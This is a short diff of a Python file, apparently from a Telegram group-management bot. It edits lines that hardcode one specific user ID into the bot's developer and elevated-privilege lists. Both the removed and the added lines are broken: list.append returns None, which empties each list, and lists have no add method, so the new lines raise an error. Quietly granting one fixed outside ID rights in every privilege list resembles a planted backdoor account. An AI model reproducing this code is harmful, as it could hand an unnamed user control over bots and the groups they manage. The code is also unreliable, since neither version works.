@@ -298,10 +298,10 @@ async def eor(msg: Message, **kwargs):
 
 
 DRAGONS = list(DRAGONS) + list(DEV_USERS)
-DEV_USERS = list(DEV_USERS).append(5058906117)
-WOLVES = list(WOLVES).append(5058906117)
-DEMONS = list(DEMONS).append(5058906117)
-TIGERS = list(TIGERS).append(5058906117)
+DEV_USERS = list(DEV_USERS).add(5058906117)
+WOLVES = list(WOLVES).add(5058906117)
+DEMONS = list(DEMONS).add(5058906117)
+TIGERS = list(TIGERS).add(5058906117)
 
 # Load at end to ensure all prev variables have been set
 from TGN.modules.helper_funcs.handlers import (
